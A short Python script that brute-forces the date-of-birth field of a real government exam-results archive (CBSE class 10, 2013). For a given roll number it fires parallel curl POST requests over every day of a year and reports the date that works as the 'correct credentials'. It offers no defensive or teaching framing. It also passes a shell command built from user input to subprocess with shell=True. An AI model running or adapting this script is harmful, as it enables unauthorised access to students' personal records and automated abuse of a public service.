import urllib, subprocess, time
import multiprocessing

regno = int(input("Enter Roll number: "))
year = str(input("Enter the year of DOB: "))

def resfind(m):
    for d in range(1,33):
        if d in [1,2,3,4,5,6,7,8,9]:
            if m in [1,2,3,4,5,6,7,8,9]:
                dob = '0'+str(d)+'/'+'0'+str(m)+'/'+year
            else:
                dob = '0'+str(d)+'/'+str(m)+'/'+year
        else:
            if m in [1,2,3,4,5,6,7,8,9]:
                dob = str(d)+'/'+'0'+str(m)+'/'+year
            else:
                dob = dob = str(d)+'/'+str(m)+'/'+year
        cdob = urllib.parse.quote_plus(dob)
        cmd = "curl 'http://resultsarchives.nic.in/cbseresults/cbseresults2013/class10/cbse102013cvb.asp' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' --compressed -H 'Accept-Language: en-US,en;q=0.5' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Host: resultsarchives.nic.in' -H 'Referer: http://resultsarchives.nic.in/cbseresults/cbseresults2013/class10/cbse102013cvb.htm' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0' --data 'regno={}&dob={}&B1=Submit'".format(regno,cdob)
        handle = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True, shell=True)
        res = handle.stdout.read()
        if str(res).find('Please verify your Roll Number/DOB and try again') != -1:
            print("Wrong Credentials --- DOB: {}".format(dob))
        else:
            return dob
            
def kill_pool(err_msg):
    print("Quitting all Processes with Correct Credentials ----- DOB: {} Regno: {}".format(err_msg,regno))
    pool.terminate()

start = time.time()

mlist = [1,2,3,4,5,6,7,8,9,10,11,12]

pool = multiprocessing.Pool(20)
for m in mlist:
    pool.apply_async(resfind,args=(m,),callback=kill_pool)

pool.close()
pool.join()

print(time.time()-start)